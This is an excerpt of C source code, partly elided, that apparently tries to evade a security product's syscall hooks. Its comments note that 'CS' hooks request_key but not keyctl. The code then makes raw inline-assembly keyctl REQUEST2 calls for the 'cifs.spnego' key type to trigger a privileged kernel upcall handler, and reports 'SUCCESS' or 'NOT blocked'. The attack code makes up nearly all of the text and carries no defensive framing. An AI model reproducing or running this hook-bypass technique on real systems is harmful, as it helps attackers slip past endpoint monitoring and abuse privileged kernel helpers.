...
int main(int argc, char **argv)
{
        ...
        /*
         * === METHOD 2: keyctl(KEYCTL_REQUEST2) via inline asm ===
         * CS hooks syscall 249 (request_key) but NOT syscall 250 (keyctl).
         * Previous EINVAL might be glibc syscall() 6-arg issue.
         * Using raw inline asm to set registers directly.
         */
        {
                const char *kt_type;
                const char *kt_callout = "x";
                const char *kt_types[] = { "user", "cifs.spnego", NULL };

                for (int i = 0; kt_types[i]; i++) {
                        kt_type = kt_types[i];
                        const char *kt_desc;
                        char user_desc[64];

                        if (i == 0) {
                                snprintf(user_desc, sizeof(user_desc),
                                         "debug:diag-%d", getpid());
                                kt_desc = user_desc;
                        } else {
                                kt_desc = desc;
                        ...
                        register long r10 asm("r10") = (long)kt_callout;
                        register long r8 asm("r8") = (long)KEY_SPEC_SESSION_KEYRING;

                        fprintf(stderr, "[keyctl-asm] REQUEST2 type=%s\n", kt_type);
                        sigprocmask(SIG_SETMASK, &blk, &old);
                        errno = 0;
                        __asm__ volatile(
                                "syscall"
                        ...
                        if (i == 1) {
                                if (ret >= 0) {
                                        fprintf(stderr, "[+] keyctl REQUEST2 cifs.spnego SUCCESS!\n");
                                        sleep(3);
                                        return 0;
                                }
                                if (errno == ENOKEY || errno == EINTR) {
                                        fprintf(stderr, "[*] keyctl NOT blocked! handler may have run\n");
                                        sleep(5);
                                        return 0;
                                }
                        }
                ...
                /* Also try glibc syscall() with explicit long casts */
                fprintf(stderr, "[keyctl-libc] REQUEST2 cifs.spnego via syscall()\n");
                errno = 0;
                {
                        long a1 = 14;
                        long a2 = (long)"cifs.spnego";
                        long a3 = (long)desc;
                        long a4 = (long)"x";
                        long a5 = (long)KEY_SPEC_SESSION_KEYRING;
                        ret = syscall(NR_keyctl, a1, a2, a3, a4, a5);
                }
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));
